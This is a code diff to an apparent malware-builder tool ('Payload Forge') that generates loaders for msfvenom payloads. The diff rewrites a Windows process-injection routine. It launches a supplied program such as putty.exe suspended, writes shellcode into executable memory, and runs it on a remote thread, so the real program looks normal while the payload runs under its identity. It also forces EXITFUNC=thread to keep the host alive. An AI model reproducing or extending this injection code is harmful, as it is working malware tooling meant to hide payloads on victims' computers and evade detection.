@@ -129,9 +129,11 @@ ENC_NOTES = {
                         "symmetric crypto). The seed rides beside the blob.",
 }
 
-PE_INJ_NOTE = ("T1055.002 — inject into a Portable Executable you supply (e.g. putty.exe): "
-               "the loader maps the host PE as a section, patches its entry with shellcode "
-               "(the classic 'runPE' route), or spawns it suspended and rewrites the entry.")
+PE_INJ_NOTE = ("T1055.002 — run inside a host PE you supply (e.g. putty.exe): the loader "
+               "spawns it SUSPENDED, writes the shellcode into the child, then resumes the "
+               "host and fires the payload on a second thread. The real program opens and "
+               "runs normally; the payload executes beside it under the host's identity. "
+               "EXITFUNC=thread is forced so the payload never kills the host on exit.")
 
 # ---------------------------------------------------------------------------
 # Small helpers
@@ -391,59 +393,37 @@ WIN_RUNPE = r'''static int pf_drop_temp(const unsigned char *data, unsigned int 
     return 1;
 }
 
-/* T1055.002 — spawn the supplied PE suspended, replace its image with the
- * host PE's headers/sections and run the payload at the entry point. The
- * host PE gives the process its name/identity; the payload executes first. */
+/* T1055.002 — run inside a host PE you supply (e.g. putty.exe). The host is
+ * spawned SUSPENDED, the shellcode is written into an RWX page in the child,
+ * the host's main thread is resumed so the real program runs normally, and
+ * the payload is fired on a second thread via CreateRemoteThread. Result:
+ * the genuine app opens and behaves as itself while the payload executes
+ * beside it under the host's process identity, name and token. */
 static int pf_run_pe(const unsigned char *sc, unsigned int sclen) {
     char path[MAX_PATH];
-    STARTUPINFOA si; PROCESS_INFORMATION pi; CONTEXT ctx;
-    PBI pbi; HMODULE nt; pNtQIP qip; pNtUnmap unmap;
-    IMAGE_DOS_HEADER *dos; IMAGE_NT_HEADERS *nth; IMAGE_SECTION_HEADER *sec;
-    WORD i; SIZE_T w; DWORD entry; LPVOID img;
+    STARTUPINFOA si; PROCESS_INFORMATION pi;
+    LPVOID r; HANDLE t;
     if (!pf_drop_temp(PF_PE, PF_PE_LEN, path, MAX_PATH)) return 0;
     ZeroMemory(&si, sizeof si); si.cb = sizeof si;
     if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                         NULL, NULL, &si, &pi)) return 0;
-    nt = GetModuleHandleA("ntdll.dll");
-    qip = (pNtQIP)GetProcAddress(nt, "NtQueryInformationProcess");
-    unmap = (pNtUnmap)GetProcAddress(nt, "NtUnmapViewOfSection");
-    if (!qip || !unmap) return 0;
-    qip(pi.hProcess, 0, &pbi, sizeof pbi, NULL);
-#ifdef _WIN64
-    { PVOID b = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x10);
-      unmap(pi.hProcess, b); }
-#else
-    { PVOID b = *(PVOID *)((PBYTE)pbi.PebBaseAddress + 0x08);
-      unmap(pi.hProcess, b); }
-#endif
-    dos = (IMAGE_DOS_HEADER *)PF_PE;
-    nth = (IMAGE_NT_HEADERS *)((PBYTE)PF_PE + dos->e_lfanew);
-    img = VirtualAllocEx(pi.hProcess,
-                         (LPVOID)(ULONG_PTR)nth->OptionalHeader.ImageBase,
-                         nth->OptionalHeader.SizeOfImage,
-                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!img) return 0;
-    WriteProcessMemory(pi.hProcess, img, PF_PE,
-                       nth->OptionalHeader.SizeOfHeaders, &w);
-    sec = IMAGE_FIRST_SECTION(nth);
-    for (i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
-        if (sec->SizeOfRawData)
-            WriteProcessMemory(pi.hProcess, (PBYTE)img + sec->VirtualAddress,
-                               (PBYTE)PF_PE + sec->PointerToRawData,
-                               sec->SizeOfRawData, &w);
+    r = VirtualAllocEx(pi.hProcess, NULL, sclen,
+                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!r) { TerminateProcess(pi.hProcess, 1); goto fail; }
+    if (!WriteProcessMemory(pi.hProcess, r, sc, sclen, NULL)) {
+        TerminateProcess(pi.hProcess, 1); goto fail;
     }
-    entry = nth->OptionalHeader.AddressOfEntryPoint;
-    WriteProcessMemory(pi.hProcess, (PBYTE)img + entry, sc, sclen, &w);
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-#ifdef _WIN64
-    ctx.Rcx = (DWORD64)(ULONG_PTR)img + entry;
-#else
-    ctx.Eax = (DWORD)(ULONG_PTR)img + entry;
-#endif
-    SetThreadContext(pi.hThread, &ctx);
-    ResumeThread(pi.hThread);
+    ResumeThread(pi.hThread);          /* host runs normally from its entry */
+    t = CreateRemoteThread(pi.hProcess, NULL, 0,
+                           (LPTHREAD_START_ROUTINE)r, NULL, 0, NULL);
+    if (t) CloseHandle(t);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return 1;
+fail:
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
 }'''
 
 MAC_TEMPLATE = r'''/* Payload Forge generated loader — build @@BUILDID@@
@@ -756,6 +736,10 @@ class Forge:
             cmd += [f"LPORT={cfg['lport']}"]
         if cfg.get("extra"):
             cmd += cfg["extra"].split()
+        if cfg.get("pe_inject"):
+            # the payload must not take the host process down when its session ends
+            cmd += ["EXITFUNC=thread"]
+            self.log("[*] EXITFUNC=thread (PE injection: host process survives session exit)")
         self.log(f"[*] Building MSFvenom payload...")
         p = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
         if p.returncode != 0 or not os.path.exists(out):
